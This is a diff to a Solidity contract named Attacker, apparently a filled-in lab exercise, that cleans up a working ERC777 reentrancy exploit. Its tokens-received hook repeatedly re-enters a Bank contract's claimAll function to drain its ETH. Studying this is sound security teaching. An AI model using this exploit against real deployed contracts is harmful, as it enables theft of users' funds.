@@ -6,8 +6,6 @@ import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
 import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
 import "./Bank.sol";
 
-// remove after
-import "forge-std/console.sol";
 
 contract Attacker is AccessControl, IERC777Recipient {
     bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
@@ -41,7 +39,7 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
 
-        emit Deposit(msg.value); // Emit event for the deposit amount
+        emit Deposit(msg.value);
         bank.deposit{value: msg.value}();
         bank.claimAll();
 	}
@@ -68,23 +66,11 @@ contract Attacker is AccessControl, IERC777Recipient {
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
 
-		// Implement reentrancy with depth limit
-		if (depth < max_depth && address(bank).balance > 0) { // Using address(bank).balance explicitly
-
-			// Use separate console.log calls for different types or complex expressions
-			console.log("Re-entering claimAll.");
-			console.log("Current Depth: ", depth);
-			console.log("Bank ETH Balance: ", address(bank).balance);
-	
-
-			depth++; // Increment depth for the recursive call
-			emit Recurse(depth); // Emit event
-			bank.claimAll(); // Re-enter the vulnerable function
-			depth--; // Decrement depth after the recursive call returns (or fails)
-		} else {
-			console.log("Stopped re-entering.");
-			console.log("Current Depth: ", depth);
-			console.log("Bank ETH Balance: ", address(bank).balance);
+		if (depth < max_depth && address(bank).balance > 0) {
+			depth++;
+			emit Recurse(depth);
+			bank.claimAll();
+			depth--;
 		}
 	}
 
